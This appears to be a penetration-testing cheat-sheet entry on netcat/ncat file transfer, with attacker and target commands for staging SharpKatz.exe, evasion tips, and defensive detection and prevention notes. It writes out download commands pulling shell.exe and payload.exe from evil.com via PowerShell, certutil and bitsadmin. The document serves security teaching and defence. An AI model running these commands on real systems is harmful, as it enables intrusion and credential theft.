examples.label: Target receives, attacker sends
examples.command:
# target:   nc -l -p 8000 > SharpKatz.exe
# attacker: nc -q 0 10.129.41.200 8000 < SharpKatz.exe

notes: `nc -lvnp 1234 > file` (receiver) and `nc <ip> 1234 < file` (sender), or /dev/tcp when nc is absent. No integrity check - md5sum both ends. Cleartext, so avoid for sensitive loot on a real test.

recommended.note: Copy/paste when no port is reachable.

name: Netcat / Ncat - File Transfer
command: nc -l -p 8000 > out.exe   # receiver ; nc -q 0 <ip> 8000 < out.exe  # sender
description: Move files with raw netcat/ncat when no HTTP/SMB is available - one side listens, the other sends. /dev/tcp can receive without any nc binary.

variations.label: Attacker serves, target pulls
variations.command:
# attacker: sudo nc -l -p 443 -q 0 < SharpKatz.exe
# target:   nc <lhost> 443 > SharpKatz.exe

defense.why_it_works: netcat/ncat pipe a file across a raw TCP connection (nc -lvnp on one side, nc target port < file on the other), or ncat with --send-only/--recv-only and optional TLS (--ssl) - a simple transfer with no protocol overhead.
defense.prerequisites: netcat/ncat on both ends and a reachable port between attacker and target.
defense.impact: Files moved over an arbitrary TCP port; with ncat --ssl the channel is encrypted.
defense.detection: A raw TCP connection on an unusual port carrying file data; nc/ncat in process logs; new file on disk. Plain nc traffic is inspectable; ncat --ssl is not.
defense.artifacts: An nc/ncat process; a connection on the chosen port; the transferred file.
defense.prevention: [MITRE T1105 M1037] Egress filtering (restrict outbound ports); IDS/IPS on raw transfers; application control/EDR flagging nc/ncat execution.
defense.evasion: Use a common-looking port (443) and ncat --ssl to encrypt and blend with TLS; short-lived connections reduce exposure.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering — block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'
